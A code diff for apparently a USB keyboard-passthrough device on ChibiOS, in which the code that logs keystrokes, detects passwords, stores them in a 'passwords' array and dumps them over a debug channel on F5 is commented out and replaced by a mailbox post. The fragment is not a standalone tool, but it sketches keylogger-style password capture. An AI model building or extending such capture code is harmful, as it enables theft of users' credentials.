@@ -17,6 +17,7 @@
 /*
  * defines
  */
+#define MB_SIZE 253
 #define NB_INPUT 200
 #define PASSWORD_MAX_SIZE 20  // must be < NB_INPUT
 
@@ -32,6 +33,8 @@ uint8_t    led_status      = 7;
 
 uint16_t passwords[PASSWORD_BUFFER_SIZE];
 int      password_index = 0;
+
+mailbox_t umb;
 
 /*
  * prototypes
@@ -52,38 +55,44 @@ static USBHHIDConfig hidcfg[HAL_USBHHID_MAX_INSTANCES];
 static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
 {
     (void)len;
-    uint8_t *report = (uint8_t *)hidp->config->report_buffer;
+    (void)*hidp;
+//  uint8_t *report = (uint8_t *)hidp->config->report_buffer;
+    msg_t msg = 12;
 
     if(hidp->type == USBHHID_DEVTYPE_BOOT_KEYBOARD) {
-        /* send the key on the computer */
-        usb_report(&UHD2, report, 8);
+        chSysLockFromISR();
+        chMBPostI(&umb, msg);
+        chSysUnlockFromISR();
 
-        //get every input in a tab
-        uint16_t input = get_input_hid(report);
-        rtt_printf("Key: %c (%04x), input_index = %d", hid2azerty(input), input, input_index);
-        if((uint8_t)input) {
-            inputs[input_index] = input;
-            usbh_detector(hid2azerty(input));
+//      /* send the key on the computer */
+//      usb_report(&UHD2, report, 8);
 
-            //input loop
-            input_index++;
-            if(input_index >= NB_INPUT)
-                input_index = 0;
-        }
+//      //get every input in a tab
+//      uint16_t input = get_input_hid(report);
+//      rtt_printf("Key: %c (%04x), input_index = %d", hid2azerty(input), input, input_index);
+//      if((uint8_t)input) {
+//          inputs[input_index] = input;
+//          usbh_detector(hid2azerty(input));
 
-        if(report[2] == KEY_F6)
-            for(int i = 0; i < input_index; i++)
-                rtt_printf("inputs[%d] = %c (%04x)", i, hid2azerty(passwords[i]), inputs[i]);
+//          //input loop
+//          input_index++;
+//          if(input_index >= NB_INPUT)
+//              input_index = 0;
+//      }
 
-        if(report[2] == KEY_F5)
-            for(int i = 0; i < password_index; i++)
-                rtt_printf("passwords[%d] = %c (%04x)", i, hid2azerty(passwords[i]), passwords[i]);
+//      if(report[2] == KEY_F6)
+//          for(int i = 0; i < input_index; i++)
+//              rtt_printf("inputs[%d] = %c (%04x)", i, hid2azerty(passwords[i]), inputs[i]);
 
-        if(report[2] == KEY_F1 &&
-           report[3] == KEY_F2 &&
-           report[4] == KEY_F3 &&
-           report[5] == KEY_F4)
-            usb_password_terminal(&UHD2);
+//      if(report[2] == KEY_F5)
+//          for(int i = 0; i < password_index; i++)
+//              rtt_printf("passwords[%d] = %c (%04x)", i, hid2azerty(passwords[i]), passwords[i]);
+
+//      if(report[2] == KEY_F1 &&
+//         report[3] == KEY_F2 &&
+//         report[4] == KEY_F3 &&
+//         report[5] == KEY_F4)
+//          usb_password_terminal(&UHD2);
     }
 }
 
